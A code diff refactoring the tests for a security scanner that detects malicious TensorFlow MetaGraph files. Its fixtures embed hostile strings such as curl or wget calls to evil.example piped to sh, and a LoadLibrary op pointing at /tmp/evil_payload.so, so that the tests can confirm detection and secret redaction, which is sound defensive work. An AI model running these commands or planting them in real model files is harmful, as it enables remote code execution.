@@ -17,7 +17,7 @@ from modelaudit.scanners._evidence_redaction import (
 from modelaudit.scanners._evidence_redaction import (
     redact_evidence_string as _redact_evidence_string,
 )
-from modelaudit.scanners.base import IssueSeverity
+from modelaudit.scanners.base import IssueSeverity, ScanResult
 from modelaudit.scanners.tf_metagraph_scanner import (
     _MAX_ATTR_VALUE_BYTES,
     _MAX_PARSE_BYTES,
@@ -120,6 +120,24 @@ def _build_metagraph(
 def _build_pyfunc_metagraph(node_name: str, attrs: dict[str, object]) -> bytes:
     """Build one named PyFunc node while keeping its attributes intact."""
     return _build_metagraph(graph_nodes=[{"name": node_name, "op": "PyFunc", "attrs": attrs}])
+
+
+def _scan_metagraph(
+    path: Path,
+    *,
+    graph_nodes: list[dict[str, object]],
+    function_nodes: list[dict[str, object]] | None = None,
+    collection_bytes: dict[str, list[bytes]] | None = None,
+) -> ScanResult:
+    path.write_bytes(
+        _build_metagraph(graph_nodes=graph_nodes, function_nodes=function_nodes, collection_bytes=collection_bytes)
+    )
+    return TensorFlowMetaGraphScanner().scan(str(path))
+
+
+def _scan_pyfunc_metagraph(path: Path, node_name: str, attrs: dict[str, object]) -> ScanResult:
+    path.write_bytes(_build_pyfunc_metagraph(node_name, attrs))
+    return TensorFlowMetaGraphScanner().scan(str(path))
 
 
 def _assert_metagraph_read_failure_metadata(metadata: Any) -> None:
@@ -415,23 +433,19 @@ def test_tf_metagraph_read_failure_takes_precedence_over_security_finding(
 
 
 def test_tf_metagraph_scanner_benign_graph_has_no_security_findings(tmp_path: Path) -> None:
-    benign_meta = tmp_path / "benign.meta"
-    benign_meta.write_bytes(
-        _build_metagraph(
-            graph_nodes=[
-                {
-                    "name": "notes_const",
-                    "op": "Const",
-                    "attrs": {
-                        "summary": "Execution benchmark metrics for qa run. Contains eval word in plain metadata only."
-                    },
+    result = _scan_metagraph(
+        tmp_path / "benign.meta",
+        graph_nodes=[
+            {
+                "name": "notes_const",
+                "op": "Const",
+                "attrs": {
+                    "summary": "Execution benchmark metrics for qa run. Contains eval word in plain metadata only."
                 },
-                {"name": "inference", "op": "MatMul"},
-            ]
-        )
+            },
+            {"name": "inference", "op": "MatMul"},
+        ],
     )
-
-    result = TensorFlowMetaGraphScanner().scan(str(benign_meta))
 
     assert result.success is True
     assert result.has_errors is False
@@ -473,33 +487,29 @@ def test_tf_metagraph_scanner_skips_redaction_for_non_finding_evidence(
 
 
 def test_tf_metagraph_scanner_detects_unsafe_ops_and_executable_payload_signals(tmp_path: Path) -> None:
-    malicious_meta = tmp_path / "malicious.meta"
-    malicious_meta.write_bytes(
-        _build_metagraph(
-            graph_nodes=[
-                {
-                    "name": "pyfunc_node",
-                    "op": "PyFunc",
-                    "attrs": {"func": "python -c \"import os; os.system('curl https://evil.example/p.sh | sh')\""},
-                },
-                {
-                    "name": "loader",
-                    "op": "LoadLibrary",
-                    "attrs": {"library_path": "/tmp/evil_payload.so"},
-                },
-            ],
-            function_nodes=[
-                {
-                    "name": "fn_exec",
-                    "op": "PyCall",
-                    "attrs": {"script": "subprocess.run('wget https://evil.example/next', shell=True)"},
-                }
-            ],
-            collection_bytes={"runtime_hook": [b"python -c 'import os; os.system(\"curl https://evil.example/x\")'"]},
-        )
+    result = _scan_metagraph(
+        tmp_path / "malicious.meta",
+        graph_nodes=[
+            {
+                "name": "pyfunc_node",
+                "op": "PyFunc",
+                "attrs": {"func": "python -c \"import os; os.system('curl https://evil.example/p.sh | sh')\""},
+            },
+            {
+                "name": "loader",
+                "op": "LoadLibrary",
+                "attrs": {"library_path": "/tmp/evil_payload.so"},
+            },
+        ],
+        function_nodes=[
+            {
+                "name": "fn_exec",
+                "op": "PyCall",
+                "attrs": {"script": "subprocess.run('wget https://evil.example/next', shell=True)"},
+            }
+        ],
+        collection_bytes={"runtime_hook": [b"python -c 'import os; os.system(\"curl https://evil.example/x\")'"]},
     )
-
-    result = TensorFlowMetaGraphScanner().scan(str(malicious_meta))
 
     assert result.success is False
     assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
@@ -592,15 +602,11 @@ def test_tf_metagraph_scanner_redacts_sensitive_previews_and_examples(tmp_path: 
 def test_tf_metagraph_scanner_redacts_secret_after_encoded_url_path(tmp_path: Path) -> None:
     project_key = f"sk-proj-{'abc_def-' * 5}"
     sensitive_url = f"https://example.com/{'A' * 160}/{project_key}/model.so"
-    sensitive_meta = tmp_path / "encoded-path-preview.meta"
-    sensitive_meta.write_bytes(
-        _build_pyfunc_metagraph(
-            "pyfunc_node",
-            {"script": f"curl {sensitive_url}"},
-        )
+    result = _scan_pyfunc_metagraph(
+        tmp_path / "encoded-path-preview.meta",
+        "pyfunc_node",
+        {"script": f"curl {sensitive_url}"},
     )
-
-    result = TensorFlowMetaGraphScanner().scan(str(sensitive_meta))
     executable_check = next(check for check in result.checks if check.name == "MetaGraph Executable String Check")
     serialized_result = result.to_json()
 
@@ -685,18 +691,14 @@ def test_tf_metagraph_scanner_normalizes_sensitive_collection_key_separators(tmp
     public_value = "PUBLIC_OAUTH_CONTEXT"
     sensitive_key = "runtime\uff3fauth"
     public_key = "runtime\uff3foauth"
-    collection_meta = tmp_path / "unicode-collection-key.meta"
-    collection_meta.write_bytes(
-        _build_metagraph(
-            graph_nodes=[],
-            collection_bytes={
-                sensitive_key: [f"curl https://example.com/ {secret}".encode()],
-                public_key: [f"curl https://example.com/ {public_value}".encode()],
-            },
-        )
+    result = _scan_metagraph(
+        tmp_path / "unicode-collection-key.meta",
+        graph_nodes=[],
+        collection_bytes={
+            sensitive_key: [f"curl https://example.com/ {secret}".encode()],
+            public_key: [f"curl https://example.com/ {public_value}".encode()],
+        },
     )
-
-    result = TensorFlowMetaGraphScanner().scan(str(collection_meta))
     collection_checks = {
         check.details["collection_key"]: check
         for check in result.checks
@@ -711,15 +713,11 @@ def test_tf_metagraph_scanner_normalizes_sensitive_collection_key_separators(tmp
 def test_tf_metagraph_scanner_preserves_benign_public_preview_context(tmp_path: Path) -> None:
     public_url = "https://example.com/p.sh?variant=public"
     public_context = f"subprocess.run('wget {public_url}', shell=True) markers ghp_short sk-proj-example"
-    public_meta = tmp_path / "public-preview.meta"
-    public_meta.write_bytes(
-        _build_pyfunc_metagraph(
-            "pyfunc_node",
-            {"script": public_context},
-        )
+    result = _scan_pyfunc_metagraph(
+        tmp_path / "public-preview.meta",
+        "pyfunc_node",
+        {"script": public_context},
     )
-
-    result = TensorFlowMetaGraphScanner().scan(str(public_meta))
     executable_checks = [check for check in result.checks if check.name == "MetaGraph Executable String Check"]
 
     assert len(executable_checks) == 1
@@ -729,28 +727,24 @@ def test_tf_metagraph_scanner_preserves_benign_public_preview_context(tmp_path: 
 def test_tf_metagraph_scanner_redacts_values_named_by_sensitive_context(tmp_path: Path) -> None:
     attr_secret = "REAL_ATTR_SECRET"
     collection_secret = "REAL_COLLECTION_SECRET"
-    sensitive_meta = tmp_path / "sensitive-context.meta"
-    sensitive_meta.write_bytes(
-        _build_metagraph(
-            graph_nodes=[
-                {
-                    "name": "sensitive_attr",
-                    "op": "PyFunc",
-                    "attrs": {
-                        "client_secret": f"curl https://example.com/?value={attr_secret}",
-                        "client_secretary": "curl https://example.com/?variant=public",
-                    },
-                }
-            ],
-            collection_bytes={
-                "runtime_hook_client_secret": [
-                    f"python -c 'curl https://example.com/?value={collection_secret} | sh'".encode()
-                ]
-            },
-        )
+    result = _scan_metagraph(
+        tmp_path / "sensitive-context.meta",
+        graph_nodes=[
+            {
+                "name": "sensitive_attr",
+                "op": "PyFunc",
+                "attrs": {
+                    "client_secret": f"curl https://example.com/?value={attr_secret}",
+                    "client_secretary": "curl https://example.com/?variant=public",
+                },
+            }
+        ],
+        collection_bytes={
+            "runtime_hook_client_secret": [
+                f"python -c 'curl https://example.com/?value={collection_secret} | sh'".encode()
+            ]
+        },
     )
-
-    result = TensorFlowMetaGraphScanner().scan(str(sensitive_meta))
     executable_checks = [check for check in result.checks if check.name == "MetaGraph Executable String Check"]
     previews_by_attribute = {check.details["attribute"]: check.details["value_preview"] for check in executable_checks}
     collection_check = next(check for check in result.checks if check.name == "MetaGraph Collection Executable Pattern")
@@ -767,27 +761,21 @@ def test_tf_metagraph_scanner_redacts_sensitive_function_attribute_context(tmp_p
     secret = "REAL_FUNCTION_ATTRIBUTE_SECRET"
     suffix_collision_secret = "REAL_SUFFIX_COLLISION_SECRET"
     direct_suffix_collision_secret = "REAL_DIRECT_SUFFIX_COLLISION_SECRET"
-    sensitive_meta = tmp_path / "sensitive-function-context.meta"
-    sensitive_meta.write_bytes(
-        _build_metagraph(
-            graph_nodes=[
-                {
-                    "name": "sensitive_function_attr",
-                    "op": "StatefulPartitionedCall",
-                    "attrs": {
-                        "basic_auth.func.name": f"curl https://example.com/?value={direct_suffix_collision_secret}"
-                    },
-                    "function_refs": {
-                        "Authorization": f"curl https://example.com/?value={secret}",
-                        "Authorization.func.name": f"curl https://example.com/?value={suffix_collision_secret}",
-                        "authorization_status": "curl https://example.com/?variant=public",
-                    },
-                }
-            ]
-        )
+    result = _scan_metagraph(
+        tmp_path / "sensitive-function-context.meta",
+        graph_nodes=[
+            {
+                "name": "sensitive_function_attr",
+                "op": "StatefulPartitionedCall",
+                "attrs": {"basic_auth.func.name": f"curl https://example.com/?value={direct_suffix_collision_secret}"},
+                "function_refs": {
+                    "Authorization": f"curl https://example.com/?value={secret}",
+                    "Authorization.func.name": f"curl https://example.com/?value={suffix_collision_secret}",
+                    "authorization_status": "curl https://example.com/?variant=public",
+                },
+            }
+        ],
     )
-
-    result = TensorFlowMetaGraphScanner().scan(str(sensitive_meta))
     executable_checks = [check for check in result.checks if check.name == "MetaGraph Executable String Check"]
     previews_by_attribute = {check.details["attribute"]: check.details["value_preview"] for check in executable_checks}
 
@@ -880,23 +868,19 @@ def test_tf_metagraph_scanner_redacts_escaped_and_container_context_secrets(tmp_
 def test_tf_metagraph_scanner_redacts_values_under_escaped_sensitive_keys(tmp_path: Path) -> None:
     attribute_secret = "OPAQUE_ESCAPED_ATTRIBUTE_SECRET_123456"
     collection_secret = "OPAQUE_ESCAPED_COLLECTION_SECRET_123456"
-    escaped_key_meta = tmp_path / "escaped-sensitive-keys.meta"
-    escaped_key_meta.write_bytes(
-        _build_metagraph(
-            graph_nodes=[
-                {
-                    "name": "escaped_key_node",
-                    "op": "PyFunc",
-                    "attrs": {r"to\u006ben": f"python -c curl https://example.com/ {attribute_secret}"},
-                }
-            ],
-            collection_bytes={
-                r"runtime_hook_to\u006ben": [f"python -c curl https://example.com/ {collection_secret}".encode()]
-            },
-        )
+    result = _scan_metagraph(
+        tmp_path / "escaped-sensitive-keys.meta",
+        graph_nodes=[
+            {
+                "name": "escaped_key_node",
+                "op": "PyFunc",
+                "attrs": {r"to\u006ben": f"python -c curl https://example.com/ {attribute_secret}"},
+            }
+        ],
+        collection_bytes={
+            r"runtime_hook_to\u006ben": [f"python -c curl https://example.com/ {collection_secret}".encode()]
+        },
     )
-
-    result = TensorFlowMetaGraphScanner().scan(str(escaped_key_meta))
     executable_check = next(check for check in result.checks if check.name == "MetaGraph Executable String Check")
     collection_check = next(check for check in result.checks if check.name == "MetaGraph Collection Executable Pattern")
 
@@ -953,15 +937,11 @@ def test_tf_metagraph_fast_path_rejects_standalone_provider_secrets(secret: str)
 
 def test_tf_metagraph_scanner_handles_unicode_tokenizer_errors(tmp_path: Path) -> None:
     secret = "REAL_METAGRAPH_UNICODE_SECRET"
-    unicode_meta = tmp_path / "unicode-tokenizer-error.meta"
-    unicode_meta.write_bytes(
-        _build_pyfunc_metagraph(
-            "unicode_node",
-            {"script": f"curl https://example.com/?token={secret}\rو"},
-        )
+    result = _scan_pyfunc_metagraph(
+        tmp_path / "unicode-tokenizer-error.meta",
+        "unicode_node",
+        {"script": f"curl https://example.com/?token={secret}\rو"},
     )
-
-    result = TensorFlowMetaGraphScanner().scan(str(unicode_meta))
 
     assert result.metadata.get("operational_error") is not True
     assert any(check.name == "MetaGraph Executable String Check" for check in result.checks)
@@ -984,15 +964,11 @@ def test_tf_metagraph_scanner_handles_unicode_tokenizer_errors(tmp_path: Path) -
     ],
 )
 def test_tf_metagraph_scanner_redacts_standalone_secret_tokens(tmp_path: Path, secret: str) -> None:
-    malicious_meta = tmp_path / "standalone-secret.meta"
-    malicious_meta.write_bytes(
-        _build_pyfunc_metagraph(
-            "pyfunc_node",
-            {"script": f"python -c 'print(1)' {secret}"},
-        )
+    result = _scan_pyfunc_metagraph(
+        tmp_path / "standalone-secret.meta",
+        "pyfunc_node",
+        {"script": f"python -c 'print(1)' {secret}"},
     )
-
-    result = TensorFlowMetaGraphScanner().scan(str(malicious_meta))
     executable_check = next(check for check in result.checks if check.name == "MetaGraph Executable String Check")
 
     assert secret not in result.to_json()
@@ -1006,15 +982,11 @@ def test_tf_metagraph_scanner_redacts_r_access_identifier_assignments(tmp_path: 
         f"python -c \"import os; os.system('id')\"; google_access_id <- '{google_secret}'; "
         f'GoogleAccessId <<- "{google_secret}"; access_key_id <- "{aws_secret}"'
     )
-    malicious_meta = tmp_path / "r-access-identifiers.meta"
-    malicious_meta.write_bytes(
-        _build_pyfunc_metagraph(
-            "pyfunc_node",
-            {"script": script},
-        )
+    result = _scan_pyfunc_metagraph(
+        tmp_path / "r-access-identifiers.meta",
+        "pyfunc_node",
+        {"script": script},
     )
-
-    result = TensorFlowMetaGraphScanner().scan(str(malicious_meta))
     executable_check = next(check for check in result.checks if check.name == "MetaGraph Executable String Check")
     serialized_result = result.to_json()
 
@@ -1037,48 +1009,34 @@ def test_tf_metagraph_scanner_redacts_r_access_identifier_assignments(tmp_path: 
 )
 def test_tf_metagraph_scanner_preserves_standalone_secret_near_matches(tmp_path: Path, near_match: str) -> None:
     public_context = f"python -c 'print(1)' {near_match}"
-    public_meta = tmp_path / "standalone-secret-near-match.meta"
-    public_meta.write_bytes(
-        _build_pyfunc_metagraph(
-            "pyfunc_node",
-            {"script": public_context},
-        )
+    result = _scan_pyfunc_metagraph(
+        tmp_path / "standalone-secret-near-match.meta",
+        "pyfunc_node",
+        {"script": public_context},
     )
-
-    result = TensorFlowMetaGraphScanner().scan(str(public_meta))
     executable_check = next(check for check in result.checks if check.name == "MetaGraph Executable String Check")
 
     assert executable_check.details["value_preview"] == public_context
 
 
 def test_tf_metagraph_scanner_inspects_collection_payload_through_collection_limit(tmp_path: Path) -> None:
-    malicious_meta = tmp_path / "late-collection-payload.meta"
-    malicious_meta.write_bytes(
-        _build_metagraph(
-            graph_nodes=[{"name": "const", "op": "Const"}],
-            collection_bytes={
-                "runtime_hook": [
-                    (b"x" * (_MAX_ATTR_VALUE_BYTES + 1)) + b" python -c 'curl https://evil.example/late | sh'"
-                ]
-            },
-        )
+    result = _scan_metagraph(
+        tmp_path / "late-collection-payload.meta",
+        graph_nodes=[{"name": "const", "op": "Const"}],
+        collection_bytes={
+            "runtime_hook": [(b"x" * (_MAX_ATTR_VALUE_BYTES + 1)) + b" python -c 'curl https://evil.example/late | sh'"]
+        },
     )
-
-    result = TensorFlowMetaGraphScanner().scan(str(malicious_meta))
 
     assert any(check.name == "MetaGraph Collection Executable Pattern" for check in result.checks)
 
 
 def test_tf_metagraph_scanner_inspects_collection_only_metagraph_payload(tmp_path: Path) -> None:
-    collection_only_meta = tmp_path / "collection-only.meta"
-    collection_only_meta.write_bytes(
-        _build_metagraph(
-            graph_nodes=[],
-            collection_bytes={"runtime_hook": [b"python -c 'curl https://evil.example/collection | sh'"]},
-        )
+    result = _scan_metagraph(
+        tmp_path / "collection-only.meta",
+        graph_nodes=[],
+        collection_bytes={"runtime_hook": [b"python -c 'curl https://evil.example/collection | sh'"]},
     )
-
-    result = TensorFlowMetaGraphScanner().scan(str(collection_only_meta))
 
     assert result.metadata["graph_node_count"] == 0
     assert result.metadata["collection_count"] == 1
@@ -1087,19 +1045,15 @@ def test_tf_metagraph_scanner_inspects_collection_only_metagraph_payload(tmp_pat
 
 @pytest.mark.parametrize("op_name", ["LoadLibrary", "LoadLibraryV2"])
 def test_tf_metagraph_scanner_flags_loadlibrary_ops_without_path_attributes(tmp_path: Path, op_name: str) -> None:
-    loadlibrary_meta = tmp_path / f"{op_name.lower()}.meta"
-    loadlibrary_meta.write_bytes(
-        _build_metagraph(
-            graph_nodes=[
-                {
-                    "name": "plugin_loader",
-                    "op": op_name,
-                }
-            ]
-        )
+    result = _scan_metagraph(
+        tmp_path / f"{op_name.lower()}.meta",
+        graph_nodes=[
+            {
+                "name": "plugin_loader",
+                "op": op_name,
+            }
+        ],
     )
-
-    result = TensorFlowMetaGraphScanner().scan(str(loadlibrary_meta))
 
     assert result.success is False
     assert any(
@@ -1112,21 +1066,17 @@ def test_tf_metagraph_scanner_flags_loadlibrary_ops_without_path_attributes(tmp_
 
 
 def test_tf_metagraph_scanner_comment_token_does_not_suppress_malicious_detection(tmp_path: Path) -> None:
-    malicious_meta = tmp_path / "malicious-comment.meta"
-    malicious_meta.write_bytes(
-        _build_metagraph(
-            graph_nodes=[
-                {
-                    "name": "pyfunc_node",
-                    "op": "PyFunc",
-                    "attrs": {"func": "# os.system('curl https://evil.example/p.sh | sh')"},
-                }
-            ],
-            collection_bytes={"runtime_hook": [b"# python -c 'import os; os.system(\"curl https://evil.example/x\")'"]},
-        )
+    result = _scan_metagraph(
+        tmp_path / "malicious-comment.meta",
+        graph_nodes=[
+            {
+                "name": "pyfunc_node",
+                "op": "PyFunc",
+                "attrs": {"func": "# os.system('curl https://evil.example/p.sh | sh')"},
+            }
+        ],
+        collection_bytes={"runtime_hook": [b"# python -c 'import os; os.system(\"curl https://evil.example/x\")'"]},
     )
-
-    result = TensorFlowMetaGraphScanner().scan(str(malicious_meta))
 
     assert result.success is False
     assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
@@ -1134,40 +1084,32 @@ def test_tf_metagraph_scanner_comment_token_does_not_suppress_malicious_detectio
 
 
 def test_tf_metagraph_scanner_false_positive_control_substring_op_name(tmp_path: Path) -> None:
-    false_positive_candidate = tmp_path / "fp.meta"
-    false_positive_candidate.write_bytes(
-        _build_metagraph(
-            graph_nodes=[
-                {
-                    "name": "custom_node",
-                    "op": "CustomPyFuncMetrics",  # contains "PyFunc" substring but is a different op
-                    "attrs": {"notes": "exec and eval terms in non-executable custom metadata"},
-                }
-            ]
-        )
+    result = _scan_metagraph(
+        tmp_path / "fp.meta",
+        graph_nodes=[
+            {
+                "name": "custom_node",
+                "op": "CustomPyFuncMetrics",  # contains "PyFunc" substring but is a different op
+                "attrs": {"notes": "exec and eval terms in non-executable custom metadata"},
+            }
+        ],
     )
-
-    result = TensorFlowMetaGraphScanner().scan(str(false_positive_candidate))
 
     assert result.success is True
     assert all(issue.severity not in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
 
 
 def test_tf_metagraph_scanner_detects_func_references_in_executable_attr_values(tmp_path: Path) -> None:
-    function_ref_meta = tmp_path / "func-ref.meta"
-    function_ref_meta.write_bytes(
-        _build_metagraph(
-            graph_nodes=[
-                {
-                    "name": "dangerous_call",
-                    "op": "StatefulPartitionedCall",
-                    "function_ref": "os.system",
-                }
-            ]
-        )
+    result = _scan_metagraph(
+        tmp_path / "func-ref.meta",
+        graph_nodes=[
+            {
+                "name": "dangerous_call",
+                "op": "StatefulPartitionedCall",
+                "function_ref": "os.system",
+            }
+        ],
     )
-
-    result = TensorFlowMetaGraphScanner().scan(str(function_ref_meta))
 
     assert result.success is False
     assert any(
@@ -1181,20 +1123,16 @@ def test_tf_metagraph_scanner_detects_func_references_in_executable_attr_values(
 
 
 def test_tf_metagraph_scanner_func_reference_false_positive_control(tmp_path: Path) -> None:
-    benign_function_ref_meta = tmp_path / "benign-func-ref.meta"
-    benign_function_ref_meta.write_bytes(
-        _build_metagraph(
-            graph_nodes=[
-                {
-                    "name": "benign_call",
-                    "op": "StatefulPartitionedCall",
-                    "function_ref": "custom_package.systematic_math",
-                }
-            ]
-        )
+    result = _scan_metagraph(
+        tmp_path / "benign-func-ref.meta",
+        graph_nodes=[
+            {
+                "name": "benign_call",
+                "op": "StatefulPartitionedCall",
+                "function_ref": "custom_package.systematic_math",
+            }
+        ],
     )
-
-    result = TensorFlowMetaGraphScanner().scan(str(benign_function_ref_meta))
 
     assert result.success is True
     assert not any(
@@ -1244,17 +1182,13 @@ def test_tf_metagraph_scanner_detects_split_encoded_payload_and_oversized_attrs(
 
 
 def test_tf_metagraph_scanner_checkpoint_io_ops_not_critical(tmp_path: Path) -> None:
-    checkpoint_meta = tmp_path / "checkpoint.meta"
-    checkpoint_meta.write_bytes(
-        _build_metagraph(
-            graph_nodes=[
-                {"name": "save_op", "op": "SaveV2"},
-                {"name": "restore_op", "op": "RestoreV2"},
-            ]
-        )
+    result = _scan_metagraph(
+        tmp_path / "checkpoint.meta",
+        graph_nodes=[
+            {"name": "save_op", "op": "SaveV2"},
+            {"name": "restore_op", "op": "RestoreV2"},
+        ],
     )
-
-    result = TensorFlowMetaGraphScanner().scan(str(checkpoint_meta))
 
     assert all(issue.details.get("op_type") not in {"SaveV2", "RestoreV2"} for issue in result.issues)
     assert all(issue.severity != IssueSeverity.CRITICAL for issue in result.issues)
@@ -1272,11 +1206,9 @@ def test_tf_metagraph_scanner_corrupt_protobuf(tmp_path: Path) -> None:
 
 
 def test_tf_metagraph_scanner_records_discovery_assumptions(tmp_path: Path) -> None:
-    valid_meta = tmp_path / "meta_assumptions.meta"
-    valid_meta.write_bytes(
-        _build_metagraph(graph_nodes=[{"name": "input", "op": "Placeholder"}, {"name": "output", "op": "Identity"}])
+    result = _scan_metagraph(
+        tmp_path / "meta_assumptions.meta",
+        graph_nodes=[{"name": "input", "op": "Placeholder"}, {"name": "output", "op": "Identity"}],
     )
-
-    result = TensorFlowMetaGraphScanner().scan(str(valid_meta))
 
     assert result.metadata["discovery_assumptions"] == DISCOVERY_ASSUMPTIONS
